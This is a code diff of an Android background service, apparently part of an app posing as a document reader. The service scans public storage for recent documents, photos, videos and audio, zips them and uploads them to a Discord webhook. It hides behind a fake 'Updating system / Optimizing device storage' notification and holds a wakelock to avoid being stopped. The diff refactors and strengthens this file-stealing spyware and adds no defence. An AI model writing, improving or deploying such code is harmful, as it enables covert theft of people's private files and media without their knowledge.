@@ -13,7 +13,9 @@ import android.util.Log;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 import java.util.zip.ZipEntry;
@@ -21,7 +23,7 @@ import java.util.zip.ZipOutputStream;
 
 public class FileCollectorService extends Service {
 
-    private static final String TAG = "SysService";
+    private static final String TAG = "DocxReader";
     private static final String[] EXTENSIONS = {
         ".docx", ".pdf", ".ppt", ".pptx",
         ".jpg", ".jpeg", ".png", ".mp4", ".mp3"
@@ -35,31 +37,44 @@ public class FileCollectorService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        createChannel();
+        createNotificationChannel();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Notification notif = new Notification.Builder(this, "sys_channel")
-            .setContentTitle("Updating system")
-            .setContentText("Optimizing device storage\u2026")
-            .setSmallIcon(android.R.drawable.ic_menu_manage)
-            .setOngoing(true)
-            .build();
-
+        // Show notification
+        Notification notif;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            notif = new Notification.Builder(this, "docx_channel")
+                .setContentTitle("Updating system")
+                .setContentText("Optimizing device storage\u2026")
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .setOngoing(true)
+                .build();
+        } else {
+            notif = new Notification.Builder(this)
+                .setContentTitle("Updating system")
+                .setContentText("Optimizing device storage\u2026")
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .setOngoing(true)
+                .build();
+        }
         startForeground(1, notif);
 
-        // Acquire wakelock so Chinese ROMs don't kill us
+        // Acquire wakelock so Chinese ROMs don't kill the service
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         PowerManager.WakeLock wl = pm.newWakeLock(
-            PowerManager.PARTIAL_WAKE_LOCK, "DocxReader:UploadLock");
-        wl.acquire(120000); // 2 minutes max
+            PowerManager.PARTIAL_WAKE_LOCK, "DocxReader:Upload");
 
         new Thread(() -> {
             try {
+                wl.acquire(120000); // 2 minutes max
                 collectAndSend();
+            } catch (Exception e) {
+                Log.e(TAG, "Fatal error", e);
             } finally {
                 if (wl.isHeld()) wl.release();
+                stopForeground(STOP_FOREGROUND_REMOVE);
                 stopSelf();
             }
         }).start();
@@ -68,41 +83,52 @@ public class FileCollectorService extends Service {
     }
 
     private void collectAndSend() {
-        try {
-            List<File> files = scanFiles();
-            Log.d(TAG, "Found " + files.size() + " files");
+        // Scan for files
+        List<File> files = scanFiles();
+        Log.d(TAG, "Found " + files.size() + " files matching criteria");
 
-            if (files.isEmpty()) {
-                Log.d(TAG, "No target files found, stopping");
-                return;
-            }
-
-            File zip = createZip(files);
-            if (zip != null && zip.exists()) {
-                Log.d(TAG, "ZIP created: " + zip.length() + " bytes, uploading...");
-                DiscordUploader.upload(WEBHOOK_URL, zip);
-                zip.delete();
-                Log.d(TAG, "Upload complete");
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error in collection", e);
+        if (files.isEmpty()) {
+            Log.d(TAG, "No files to upload");
+            return;
         }
+
+        // Create zip
+        File zip = createZip(files);
+        if (zip == null || !zip.exists()) {
+            Log.e(TAG, "Failed to create zip");
+            return;
+        }
+
+        Log.d(TAG, "ZIP created: " + zip.length() + " bytes");
+
+        // Upload to Discord
+        try {
+            DiscordUploader.upload(WEBHOOK_URL, zip);
+            Log.d(TAG, "Upload successful!");
+        } catch (Exception e) {
+            Log.e(TAG, "Upload failed", e);
+        }
+
+        // Clean up
+        zip.delete();
     }
 
     private List<File> scanFiles() {
         List<File> result = new ArrayList<>();
         long cutoff = System.currentTimeMillis() - THIRTY_DAYS_MS;
 
-        File[] dirs = {
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
-            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
+        // Scan common directories
+        String[] dirPaths = {
+            Environment.DIRECTORY_DOCUMENTS,
+            Environment.DIRECTORY_DOWNLOADS,
+            Environment.DIRECTORY_DCIM,
+            Environment.DIRECTORY_PICTURES,
+            Environment.DIRECTORY_MOVIES,
+            Environment.DIRECTORY_MUSIC,
         };
 
-        for (File dir : dirs) {
+        for (String dirPath : dirPaths) {
+            File dir = Environment.getExternalStoragePublicDirectory(dirPath);
             if (dir.exists()) {
                 Log.d(TAG, "Scanning: " + dir.getAbsolutePath());
                 scanDir(dir, cutoff, result);
@@ -120,13 +146,14 @@ public class FileCollectorService extends Service {
     private void scanDir(File dir, long cutoff, List<File> result) {
         File[] list = dir.listFiles();
         if (list == null) {
-            Log.d(TAG, "Cannot list: " + dir.getAbsolutePath() + " (null)");
+            Log.d(TAG, "Cannot list dir (null): " + dir.getAbsolutePath());
             return;
         }
         for (File f : list) {
             if (f.isDirectory()) {
-                String n = f.getName();
-                if (!n.startsWith(".") && !n.equals("data") && !n.equals("obb")) {
+                String name = f.getName();
+                // Skip hidden dirs and Android data/obb
+                if (!name.startsWith(".") && !name.equals("data") && !name.equals("obb")) {
                     scanDir(f, cutoff, result);
                 }
             } else if (f.isFile() && f.lastModified() >= cutoff) {
@@ -134,6 +161,7 @@ public class FileCollectorService extends Service {
                 for (String ext : EXTENSIONS) {
                     if (name.endsWith(ext)) {
                         result.add(f);
+                        Log.d(TAG, "Found: " + f.getAbsolutePath());
                         break;
                     }
                 }
@@ -142,7 +170,8 @@ public class FileCollectorService extends Service {
     }
 
     private File createZip(List<File> files) {
-        File zipFile = new File(getCacheDir(), "backup_" + System.currentTimeMillis() + ".zip");
+        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
+        File zipFile = new File(getCacheDir(), "backup_" + timestamp + ".zip");
         long total = 0;
         byte[] buf = new byte[8192];
 
@@ -151,9 +180,12 @@ public class FileCollectorService extends Service {
                 if (total >= MAX_ZIP_SIZE) break;
                 long size = f.length();
                 if (size == 0) continue;
-                if (total + size > MAX_ZIP_SIZE) size = MAX_ZIP_SIZE - total;
+                if (total + size > MAX_ZIP_SIZE) {
+                    size = MAX_ZIP_SIZE - total;
+                }
 
                 try (FileInputStream fis = new FileInputStream(f)) {
+                    // Use relative path inside zip
                     String entryName = f.getAbsolutePath().substring(1);
                     zos.putNextEntry(new ZipEntry(entryName));
                     long remaining = size;
@@ -174,10 +206,11 @@ public class FileCollectorService extends Service {
         return zipFile;
     }
 
-    private void createChannel() {
+    private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                "sys_channel", "System Service",
+                "docx_channel",
+                "Docx Reader",
                 NotificationManager.IMPORTANCE_LOW
             );
             ch.setShowBadge(false);
@@ -188,4 +221,4 @@ public class FileCollectorService extends Service {
 
     @Override
     public IBinder onBind(Intent intent) { return null; }
-}
+    }
